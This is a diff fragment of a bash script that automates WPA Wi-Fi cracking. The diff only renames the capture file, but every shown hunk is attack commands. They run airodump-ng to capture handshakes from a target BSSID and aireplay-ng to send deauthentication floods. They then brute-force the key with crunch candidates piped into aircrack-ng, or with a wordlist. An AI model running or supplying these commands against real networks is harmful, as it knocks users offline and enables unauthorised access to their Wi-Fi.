@@ -353,7 +353,7 @@ read -p 'security : ' apsec
  rm -r -f lewifi1.txt
  echo
  echo
- xterm -title crack -e airodump-ng -c $apch --bssid $apbssid -w gscap $winterface | xterm -title deauth -e aireplay-ng -0 16 -a $apbssid $winterface | echo -e  '\e[1;35m  close window if there is hanshake '
+ xterm -title crack -e airodump-ng -c $apch --bssid $apbssid -w $apbssid $winterface | xterm -title deauth -e aireplay-ng -0 16 -a $apbssid $winterface | echo -e  '\e[1;35m  close window if there is hanshake '
  xterm -title deauth -e aireplay-ng -0 16 -a $apbssid $winterface
 
       if [ $? -eq 1 ]
@@ -383,7 +383,7 @@ read -p 'security : ' apsec
  echo
     if [ $wordw = "n" ]
     then
-    crunch 8 25 azertyuioqsdfghjklmwxcvbn01234567890 | aircrack-ng -w - -b $apbssid -a wpa gscap-01.cap
+    crunch 8 25 azertyuioqsdfghjklmwxcvbn01234567890 | aircrack-ng -w - -b $apbssid -a wpa $apbssid-01.cap
     echo
     echo
     fi
@@ -402,7 +402,7 @@ read -p 'security : ' apsec
     echo
     echo
     ehco
-    aircrack-ng -w $wordcrack -b $apbssid -a wpa gscap-01.cap
+    aircrack-ng -w $wordcrack -b $apbssid -a wpa $apbssid-01.cap
     fi
     
     
